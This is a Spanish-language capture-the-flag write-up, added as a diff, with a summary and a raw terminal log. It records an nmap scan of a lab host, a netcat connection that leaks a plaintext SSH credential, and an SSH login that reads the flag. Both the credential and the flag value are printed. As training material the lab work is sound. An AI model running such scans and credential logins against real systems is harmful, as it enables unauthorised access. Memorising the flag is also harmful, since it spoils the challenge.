@@ -1,0 +1,131 @@
+Observación: se detectaron servicios abiertos tras un escaneo Nmap (SSH en 22 y 2222, servicio inusual en 31337).
+Prueba: se conectó al puerto 31337 con netcat y se intentaron credenciales descubiertas contra los SSH; 22 aceptó acceso por contraseña.
+
+Hallazgo: acceso shell como ubuntu y lectura de la bandera del CTF (flag{...}).
+Conclusión: el reto se resolvió con reconocimiento y explotación directa de credenciales dejadas por el servicio — sin pivotar ni explotación compleja; buen ejercicio de flujo básico de pentesting.
+
+Pasos para replicar (resumen): nmap → nc → probar credenciales → explorar filesystem → extraer bandera.
+
+
+
+-PROCEDIMIENTO- 
+
+sudo nmap -sV -O -A -sS -Pn- 10.201.6.105
+
+Starting Nmap 7.93 ( https://nmap.org ) at 2025-11-01 02:35 UTC
+Nmap scan report for ip-10-201-6-105.ec2.internal (10.201.6.105)
+Host is up (0.00059s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 7ddceb90e4af33d99f0b219afcd577f2 (RSA)
+|   256 83a74a61ef93a3571a57385c482aeb16 (ECDSA)
+|_  256 30bfef9408860700f7fcdfe8edfe07af (ED25519)
+2222/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 576177d49cad8f3a13c065da3265abca (RSA)
+|   256 27764910dc423072192e3fee612c0a3c (ECDSA)
+|_  256 9b1343801685fcb4d0eefed65811259f (ED25519)
+31337/tcp open  Elite?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
+|     In case I forget - user:pass
+|_    ubuntu:Dafdas!!/str0ng
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port31337-TCP:V=7.93%I=7%D=11/1%Time=690571D9%P=x86_64-pc-linux-gnu%r(N
+SF:ULL,35,"In\x20case\x20I\x20forget\x20-\x20user:pass\nubuntu:Dafdas!!/st
+SF:r0ng\n\n")%r(GetRequest,35,"In\x20case\x20I\x20forget\x20-\x20user:pass
+SF:\nubuntu:Dafdas!!/str0ng\n\n")%r(SIPOptions,35,"In\x20case\x20I\x20forg
+SF:et\x20-\x20user:pass\nubuntu:Dafdas!!/str0ng\n\n")%r(GenericLines,35,"I
+SF:n\x20case\x20I\x20forget\x20-\x20user:pass\nubuntu:Dafdas!!/str0ng\n\n"
+SF:)%r(HTTPOptions,35,"In\x20case\x20I\x20forget\x20-\x20user:pass\nubuntu
+SF::Dafdas!!/str0ng\n\n")%r(RTSPRequest,35,"In\x20case\x20I\x20forget\x20-
+SF:\x20user:pass\nubuntu:Dafdas!!/str0ng\n\n")%r(RPCCheck,35,"In\x20case\x
+SF:20I\x20forget\x20-\x20user:pass\nubuntu:Dafdas!!/str0ng\n\n")%r(DNSVers
+SF:ionBindReqTCP,35,"In\x20case\x20I\x20forget\x20-\x20user:pass\nubuntu:D
+SF:afdas!!/str0ng\n\n")%r(DNSStatusRequestTCP,35,"In\x20case\x20I\x20forge
+SF:t\x20-\x20user:pass\nubuntu:Dafdas!!/str0ng\n\n")%r(Help,35,"In\x20case
+SF:\x20I\x20forget\x20-\x20user:pass\nubuntu:Dafdas!!/str0ng\n\n")%r(SSLSe
+SF:ssionReq,35,"In\x20case\x20I\x20forget\x20-\x20user:pass\nubuntu:Dafdas
+SF:!!/str0ng\n\n")%r(TerminalServerCookie,35,"In\x20case\x20I\x20forget\x2
+SF:0-\x20user:pass\nubuntu:Dafdas!!/str0ng\n\n")%r(TLSSessionReq,35,"In\x2
+SF:0case\x20I\x20forget\x20-\x20user:pass\nubuntu:Dafdas!!/str0ng\n\n")%r(
+SF:Kerberos,35,"In\x20case\x20I\x20forget\x20-\x20user:pass\nubuntu:Dafdas
+SF:!!/str0ng\n\n")%r(SMBProgNeg,35,"In\x20case\x20I\x20forget\x20-\x20user
+SF::pass\nubuntu:Dafdas!!/str0ng\n\n")%r(X11Probe,35,"In\x20case\x20I\x20f
+SF:orget\x20-\x20user:pass\nubuntu:Dafdas!!/str0ng\n\n")%r(FourOhFourReque
+SF:st,35,"In\x20case\x20I\x20forget\x20-\x20user:pass\nubuntu:Dafdas!!/str
+SF:0ng\n\n")%r(LPDString,35,"In\x20case\x20I\x20forget\x20-\x20user:pass\n
+SF:ubuntu:Dafdas!!/str0ng\n\n")%r(LDAPSearchReq,35,"In\x20case\x20I\x20for
+SF:get\x20-\x20user:pass\nubuntu:Dafdas!!/str0ng\n\n")%r(LDAPBindReq,35,"I
+SF:n\x20case\x20I\x20forget\x20-\x20user:pass\nubuntu:Dafdas!!/str0ng\n\n"
+SF:)%r(LANDesk-RC,35,"In\x20case\x20I\x20forget\x20-\x20user:pass\nubuntu:
+SF:Dafdas!!/str0ng\n\n")%r(TerminalServer,35,"In\x20case\x20I\x20forget\x2
+SF:0-\x20user:pass\nubuntu:Dafdas!!/str0ng\n\n");
+MAC Address: 16:FF:C5:74:58:3D (Unknown)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.59 ms ip-10-201-6-105.ec2.internal (10.201.6.105)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 3.79 seconds
+                                                                                         
+┌──(root㉿kali)-[~]
+└─# nc 10.201.6.105 31337
+In case I forget - user:pass
+ubuntu:Dafdas!!/str0ng
+
+                                                                                         
+┌──(root㉿kali)-[~]
+└─# ssh ubuntu@10.201.6.105 -p 2222
+The authenticity of host '[10.201.6.105]:2222 ([10.201.6.105]:2222)' can't be established.
+ED25519 key fingerprint is SHA256:JICTLz5VlU+xsIr0tDhQpivCYyf6pqnkHgTPLXrDSMk.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[10.201.6.105]:2222' (ED25519) to the list of known hosts.
+ubuntu@10.201.6.105: Permission denied (publickey).
+                                                                                         
+┌──(root㉿kali)-[~]
+└─# ssh ubuntu@10.201.6.105 -p 22  
+The authenticity of host '10.201.6.105 (10.201.6.105)' can't be established.
+ED25519 key fingerprint is SHA256:8VuYGtc5lO2sXK+MVsdbgQV9nF+EVHf8wJcrMAEWg10.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.201.6.105' (ED25519) to the list of known hosts.
+ubuntu@10.201.6.105's password: 
+Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.13.0-1014-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+$ pwd
+/home/ubuntu
+$ cd ..
+$ ls
+ubuntu  user
+$ cd user
+$ ls
+flag.txt
+$ cat flag.txt
+flag{251f309497a18888dde5222761ea88e4}$ 
